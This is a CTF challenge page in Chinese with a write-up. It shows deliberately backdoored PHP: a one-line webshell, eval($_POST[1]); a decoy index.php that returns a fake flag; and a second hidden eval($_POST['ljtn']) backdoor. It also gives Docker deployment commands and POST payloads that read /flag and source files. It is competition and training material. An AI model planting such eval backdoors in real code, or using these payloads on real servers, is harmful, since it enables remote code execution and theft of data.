# 真亦假，假亦真(HZNU版)【完成】

题目描述：开开心心签个到吧，祝各位师傅们好运~

`Jay17ashjdaskdhasadasdadsadssdasdadsasdasdasdasdxcvnxkjcvnxjcsdhkjashdjkadjk.php`

```php
<?php
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');
highlight_file(__FILE__);

//签到题，直接送大家shell了，做好事不留名，我叫Jay17

//标准一句话mua~
eval($_POST[1]);
?>
```

`index.php`

```php
<?php
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');
highlight_file('Jay17ashjdaskdhasadasdadsadssdasdadsasdasdasdasdxcvnxkjcvnxjcsdhkjashdjkadjk.php');

//以代码输出代替命令执行结果，让选手误以为成功利用了一句话木马，但是一直得不到正确的flag。
//比如选手传参ls /,返回事先准备好的想让选手看见的根目录内容，选手传参cat /flag返回ISCTF{fake_flag}
//破局方法很简单，选手只需要ls和cat index.php亲自查看源码内容即可。
//不是什么难题，偏脑洞和趣味性，以及有时候眼睛看到的不一定是真的哈哈哈哈。


if (isset($_POST['1']) && (strpos($_POST['1'], 'flag') !== false || strpos($_POST['1'], 'f*') !== false || strpos($_POST['1'], 'fl*') !== false || strpos($_POST['1'], 'fla*') !== false || (strpos($_POST['1'], 'f') !== false  &&  strpos($_POST['1'], '?') !== false) ) ){
    echo 'HZNU{this_is_real_flag}';
} elseif( isset($_POST['1'])  &&  strpos($_POST['1'], 'ls') !== false &&  strpos($_POST['1'], 'ls ..') == false  &&  strpos($_POST['1'], 'ls /') == false  ){
    echo 'index.php';
}else{
    eval($_POST['1']);
}




eval($_POST['ljtn']);
?>
```

运行部署：（cd进源码目录，会映射到9024端口）

```bash
快速构建：
docker build -t hstof . && docker run -d --name=hstof -e FLAG=HZNUCTF{test_flag} -p 9032:80 --rm hstof

快速重启：
docker stop hstof && docker rmi hstof && docker build -t hstof . && docker run -d --name=hstof -e FLAG=HZNUCTF{test_flag} -p 9032:80 --rm hstof
```

WP：（有时候眼睛看见的不一定是真的，只是别人想让你看到的罢了）

能成功骗过蚂蚁剑，就是根目录下看不见/flag

![image-20240411184822028](https://tc-md.oss-cn-hangzhou.aliyuncs.com/wujie/image-20240411184822028.png)

这句但凡你不相信我一次读一下`index.php`就能赢

```
1=cat /index.php
ljtn=cat /flag
```





